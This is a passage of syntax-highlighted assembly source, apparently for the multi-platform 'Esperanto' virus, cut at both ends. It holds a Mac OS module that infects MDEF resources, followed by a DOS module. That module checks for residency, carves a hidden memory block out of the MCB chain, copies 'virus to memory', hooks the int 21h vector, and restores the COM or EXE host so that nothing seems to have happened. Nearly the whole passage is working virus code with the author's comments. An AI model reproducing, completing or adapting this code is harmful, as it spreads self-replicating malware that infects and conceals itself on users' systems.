                </span><span class="sc5">subq.w</span><span class="sc0">  #</span><span class="sc5">$4</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                      </span><span class="sc1">; Empty stack (4 bytes)</span><span class="sc0">
                </span><span class="sc5">move.l</span><span class="sc0">  #</span><span class="sc12">'MDEF'</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">               </span><span class="sc1">; Now open again the</span><span class="sc0">
                </span><span class="sc5">move.w</span><span class="sc0">  #</span><span class="sc5">$espo_file_size</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; MDEF resource in order</span><span class="sc0">
                </span><span class="sc5">_GetResource</span><span class="sc0">                        </span><span class="sc1">; to complete infection</span><span class="sc0">

                </span><span class="sc5">movea.l</span><span class="sc0"> </span><span class="sc5">d5</span><span class="sc4">,</span><span class="sc5">a0</span><span class="sc0">                       </span><span class="sc1">; Move our delta to a0</span><span class="sc0">
                </span><span class="sc5">movea.l</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">                     </span><span class="sc1">; Move 1st byte to a0</span><span class="sc0">
                </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc8">sp</span><span class="sc4">)+,</span><span class="sc5">$6</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">)</span><span class="sc0">                </span><span class="sc1">; Move MDEF address to</span><span class="sc0">
                </span><span class="sc5">move.w</span><span class="sc0">  </span><span class="sc5">d7</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">; a0+$6 and use the CODE</span><span class="sc0">
                </span><span class="sc5">_UseResFile</span><span class="sc0">                         </span><span class="sc1">; resource (addr.in d7)</span><span class="sc0">
                </span><span class="sc5">bra</span><span class="sc0">     </span><span class="sc5">calc_new_size</span><span class="sc0">               </span><span class="sc1">; Calculate new size</span><span class="sc0">

</span><span class="sc5">new_mdef</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc5">movea.l</span><span class="sc0"> </span><span class="sc5">d5</span><span class="sc4">,</span><span class="sc5">a0</span><span class="sc0">                       </span><span class="sc1">; Move ëelta to a0</span><span class="sc0">
                </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">                     </span><span class="sc1">; Move 1st byte to a0</span><span class="sc0">
                </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a4</span><span class="sc4">,</span><span class="sc5">$6</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">)</span><span class="sc0">                   </span><span class="sc1">; Move address for MDEF</span><span class="sc0">
                </span><span class="sc5">clr.w</span><span class="sc0">   </span><span class="sc4">-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">                       </span><span class="sc1">; to a0+$6 and call</span><span class="sc0">
                </span><span class="sc5">_UseResFile</span><span class="sc0">                         </span><span class="sc1">; UseResFile function</span><span class="sc0">

                </span><span class="sc5">subq.w</span><span class="sc0">  #</span><span class="sc5">$4</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                      </span><span class="sc1">; Empty stack (4 bytes)</span><span class="sc0">
                </span><span class="sc5">move.l</span><span class="sc0">  #</span><span class="sc12">'MDEF'</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">               </span><span class="sc1">; Move resource name</span><span class="sc0">
                </span><span class="sc5">clr.w</span><span class="sc0">   </span><span class="sc4">-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">                       </span><span class="sc1">; Clear one word</span><span class="sc0">
                </span><span class="sc5">_Get1Resource</span><span class="sc0">                       </span><span class="sc1">; Get a new resource</span><span class="sc0">

                </span><span class="sc5">movea.l</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc8">sp</span><span class="sc4">)+,</span><span class="sc5">a2</span><span class="sc0">                    </span><span class="sc1">; Move its address to a2</span><span class="sc0">
                </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a2</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">; Push a2 into the stack</span><span class="sc0">
                </span><span class="sc5">_DetachResource</span><span class="sc0">                     </span><span class="sc1">; Detach the new resource</span><span class="sc0">

                </span><span class="sc5">move.w</span><span class="sc0">  </span><span class="sc5">d4</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">; Use current resource</span><span class="sc0">
                </span><span class="sc5">_UseResFile</span><span class="sc0">                         </span><span class="sc1">; file previously stored</span><span class="sc0">

                </span><span class="sc5">subq.w</span><span class="sc0">  #</span><span class="sc5">$4</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                      </span><span class="sc1">; Empty stack (4 bytes)</span><span class="sc0">
                </span><span class="sc5">move.l</span><span class="sc0">  #</span><span class="sc12">'MDEF'</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">               </span><span class="sc1">; Move resource name</span><span class="sc0">
                </span><span class="sc5">clr.w</span><span class="sc0">   </span><span class="sc4">-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">                       </span><span class="sc1">; Clear one word</span><span class="sc0">
                </span><span class="sc5">_Get1Resource</span><span class="sc0">                       </span><span class="sc1">; Get the new resource</span><span class="sc0">

                </span><span class="sc5">movea.l</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc8">sp</span><span class="sc4">)+,</span><span class="sc5">a4</span><span class="sc0">                    </span><span class="sc1">; Move address to a4</span><span class="sc0">
                </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a4</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">                       </span><span class="sc1">; Is this address busy?</span><span class="sc0">
                </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">address_used</span><span class="sc0">                </span><span class="sc1">; Branch if so</span><span class="sc0">

                </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a2</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">; Stack resource address</span><span class="sc0">
                </span><span class="sc5">move.l</span><span class="sc0">  #</span><span class="sc12">'MDEF'</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">               </span><span class="sc1">; Move resource name</span><span class="sc0">
                </span><span class="sc5">clr.w</span><span class="sc0">   </span><span class="sc4">-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">                       </span><span class="sc1">; Clear one word</span><span class="sc0">
                </span><span class="sc5">pea</span><span class="sc0">     </span><span class="sc5">second_tab</span><span class="sc0">                  </span><span class="sc1">; Resource identifier</span><span class="sc0">
                </span><span class="sc5">_AddResource</span><span class="sc0">                        </span><span class="sc1">; Add new resource</span><span class="sc0">

                </span><span class="sc5">subq.w</span><span class="sc0">  #</span><span class="sc5">$2</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                      </span><span class="sc1">; Empty stack (2 bytes)</span><span class="sc0">
                </span><span class="sc5">_CurResFile</span><span class="sc0">                         </span><span class="sc1">; Current resource file</span><span class="sc0">
                </span><span class="sc5">_UpdateResFile</span><span class="sc0">                      </span><span class="sc1">; Update resource file</span><span class="sc0">
                </span><span class="sc5">bra.s</span><span class="sc0">   </span><span class="sc5">calc_new_size</span><span class="sc0">               </span><span class="sc1">; Calculate new size</span><span class="sc0">

</span><span class="sc5">address_used</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">move.w</span><span class="sc0">  </span><span class="sc5">d7</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">; Use current resource</span><span class="sc0">
                </span><span class="sc5">_UseResFile</span><span class="sc0">                         </span><span class="sc1">; file previously stored</span><span class="sc0">

                </span><span class="sc5">subq.w</span><span class="sc0">  #</span><span class="sc5">$4</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                      </span><span class="sc1">; Empty stack (4 bytes)</span><span class="sc0">
                </span><span class="sc5">move.l</span><span class="sc0">  #</span><span class="sc12">'MDEF'</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">               </span><span class="sc1">; Move resource name</span><span class="sc0">
                </span><span class="sc5">clr.w</span><span class="sc0">   </span><span class="sc4">-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">                       </span><span class="sc1">; Clear one word</span><span class="sc0">
                </span><span class="sc5">_Get1Resource</span><span class="sc0">                       </span><span class="sc1">; Get one resource</span><span class="sc0">

                </span><span class="sc5">movea.l</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc8">sp</span><span class="sc4">)+,</span><span class="sc5">a4</span><span class="sc0">                    </span><span class="sc1">; Move its address to a4</span><span class="sc0">
                </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a4</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">                       </span><span class="sc1">; Compare it again</span><span class="sc0">
                </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">calc_new_size</span><span class="sc0">               </span><span class="sc1">; Branch if not equal</span><span class="sc0">

                </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a2</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">; Stack resource address</span><span class="sc0">
                </span><span class="sc5">move.l</span><span class="sc0">  #</span><span class="sc12">'MDEF'</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">               </span><span class="sc1">; Move resource name</span><span class="sc0">
                </span><span class="sc5">clr.w</span><span class="sc0">   </span><span class="sc4">-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">                       </span><span class="sc1">; Clear one word</span><span class="sc0">
                </span><span class="sc5">pea</span><span class="sc0">     </span><span class="sc5">second_tab</span><span class="sc0">                  </span><span class="sc1">; Resource ID string</span><span class="sc0">
                </span><span class="sc5">_AddResource</span><span class="sc0">                        </span><span class="sc1">; Add new resource</span><span class="sc0">

                </span><span class="sc5">subq.w</span><span class="sc0">  #</span><span class="sc5">$2</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                      </span><span class="sc1">; Empty stack (2 bytes)</span><span class="sc0">
                </span><span class="sc5">_CurResFile</span><span class="sc0">                         </span><span class="sc1">; Current resource file</span><span class="sc0">
                </span><span class="sc5">_UpdateResFile</span><span class="sc0">                      </span><span class="sc1">; Update resource file</span><span class="sc0">

</span><span class="sc5">calc_new_size</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d5</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">; Move delta into stack</span><span class="sc0">
                </span><span class="sc5">_CalcMenuSize</span><span class="sc0">                       </span><span class="sc1">; Calculate new menu size</span><span class="sc0">

                </span><span class="sc5">movem.l</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc8">sp</span><span class="sc4">)+,</span><span class="sc5">d4</span><span class="sc4">-</span><span class="sc5">d7</span><span class="sc4">/</span><span class="sc5">a2</span><span class="sc4">-</span><span class="sc5">a4</span><span class="sc0">           </span><span class="sc1">; Restore used registers</span><span class="sc0">
                </span><span class="sc5">unlk</span><span class="sc0">    </span><span class="sc5">a6</span><span class="sc0">                          </span><span class="sc1">; Unlink code address</span><span class="sc0">
                </span><span class="sc5">movea.l</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc8">sp</span><span class="sc4">)+,</span><span class="sc5">a0</span><span class="sc0">                    </span><span class="sc1">; Move original address</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc5">$12</span><span class="sc4">(</span><span class="sc8">sp</span><span class="sc4">),</span><span class="sc8">sp</span><span class="sc0">                  </span><span class="sc1">; to a0, restore stack</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">)</span><span class="sc0">                        </span><span class="sc1">; and jump back to it</span><span class="sc0">

                </span><span class="sc5">dc.l</span><span class="sc0">    #</span><span class="sc12">'MAIN'</span><span class="sc0">                     </span><span class="sc1">; Main code module</span><span class="sc0">
                </span><span class="sc5">dc.w</span><span class="sc0">    #</span><span class="sc5">$2020</span><span class="sc0">                      </span><span class="sc1">; Pre-initialized gaps</span><span class="sc0">
                </span><span class="sc5">dc.w</span><span class="sc0">    #</span><span class="sc5">$2020</span><span class="sc0">                      </span><span class="sc1">; for Mac OS Finder</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ Data area for Mac OS module ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">first_tab</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">dc.w</span><span class="sc0">    #</span><span class="sc5">$16</span><span class="sc0">                        </span><span class="sc1">; For _GetNamedResource</span><span class="sc0">
</span><span class="sc5">second_tab</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">dc.b</span><span class="sc0">    #</span><span class="sc5">$7</span><span class="sc0">                         </span><span class="sc1">; For _AddResource</span><span class="sc0">
</span><span class="sc5">name_only</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">dc.l</span><span class="sc0">    #</span><span class="sc12">'Esperanto'</span><span class="sc0">                </span><span class="sc1">; For _SetResInfo</span><span class="sc0">

</span><span class="sc1">; ÍÍ¹ DOS runtime module ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc5">real_ce_entry</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">delta_offset</span><span class="sc0">                </span><span class="sc1">; Get ë-offset in BP in</span><span class="sc0">
</span><span class="sc5">delta_offset</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                          </span><span class="sc1">; the traditional and</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_offset</span><span class="sc0">      </span><span class="sc1">; always effective way :)</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                       </span><span class="sc1">; Segment push/popping</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">; for l8r use in our code</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">':)'</span><span class="sc0">                     </span><span class="sc1">; Residency check</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; Are we home?</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">';)'</span><span class="sc0">                     </span><span class="sc1">; Winky smiley, we are</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">work_done</span><span class="sc0">                   </span><span class="sc1">; already resident...</span><span class="sc0">

</span><span class="sc5">go_mem_res</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                       </span><span class="sc1">; Residency routine</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">; Get our host's MCB</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; segment and point its</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                       </span><span class="sc1">; start with DI</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'Y'</span><span class="sc0">        </span><span class="sc1">; Is it a Z block?</span><span class="sc0">
                </span><span class="sc6">jna</span><span class="sc0">     </span><span class="sc5">work_done</span><span class="sc0">                   </span><span class="sc1">; Exit if it is not</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],((</span><span class="sc5">espo_mem_size</span><span class="sc4">/</span><span class="sc2">10h</span><span class="sc4">)+</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],((</span><span class="sc5">espo_mem_size</span><span class="sc4">/</span><span class="sc2">10h</span><span class="sc4">)+</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">; Get a new MCB segment</span><span class="sc0">
                                                    </span><span class="sc1">; for the viral code</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">        </span><span class="sc1">; Mark it as a Z block</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">        </span><span class="sc1">; And as a system block</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],((</span><span class="sc5">espo_mem_size</span><span class="sc4">/</span><span class="sc2">10h</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">00534f44h</span><span class="sc0"> </span><span class="sc1">; Owner ID -&gt; DOS</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">                                 </span><span class="sc1">; Clear direction flag</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                          </span><span class="sc1">; Point with CS and DS</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">; to the code running now</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; ES = virus segment</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">espo_file_size</span><span class="sc0">           </span><span class="sc1">; CX = virus size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                       </span><span class="sc1">; SI = virus start</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                       </span><span class="sc1">; Copy virus to memory</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                          </span><span class="sc1">; Now jump to our copy</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">copy_vector</span><span class="sc0">          </span><span class="sc1">; in memory so we don't</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">                                </span><span class="sc1">; have to use ë-offset</span><span class="sc0">

</span><span class="sc5">copy_vector</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">; Save DS in the stack</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">; DS = CX = 0 -&gt; IVT</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; Point int 21h vector</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">old_int_21h</span><span class="sc0">              </span><span class="sc1">; Point our storage</span><span class="sc0">
                </span><span class="sc6">movsd</span><span class="sc0">                               </span><span class="sc1">; Store old vector</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_int_21h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">; Once we've set the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; new int 21h vector,</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; check out our host</span><span class="sc0">

</span><span class="sc5">work_done</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">file_flag</span><span class="sc4">],</span><span class="sc12">'C'</span><span class="sc0"> </span><span class="sc1">; Is our host a COM?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">restore_com</span><span class="sc0">                 </span><span class="sc1">; Yes, restore it</span><span class="sc0">

</span><span class="sc5">restore_exe</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                          </span><span class="sc1">; In case it's an EXE</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                       </span><span class="sc1">; file, get PSP segment</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                      </span><span class="sc1">; and adjust it to</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">exe_cs</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; execute our host code</span><span class="sc0">

                </span><span class="sc6">cli</span><span class="sc0">                                 </span><span class="sc1">; Clear interrupts</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">exe_sp</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Set new SP</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">exe_ss</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get SS and add to it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; the PSP+10h value</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">                                 </span><span class="sc1">; Set interrupts</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; Set the value of all</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                       </span><span class="sc1">; these registers to 0</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">; so it seems that</span><span class="sc0">
                </span><span class="sc6">cwd</span><span class="sc0">                                 </span><span class="sc1">; nothing has happened</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                       </span><span class="sc1">; and we've not been</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                       </span><span class="sc1">; here infecting :)</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">exe_cs</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Push initial segment</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">exe_ip</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Push initial offset</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                       </span><span class="sc1">; And jump into there!</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc5">restore_com</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">old_com_header</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Point to the buffer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                     </span><span class="sc1">; in which we've stored</span><span class="sc0">
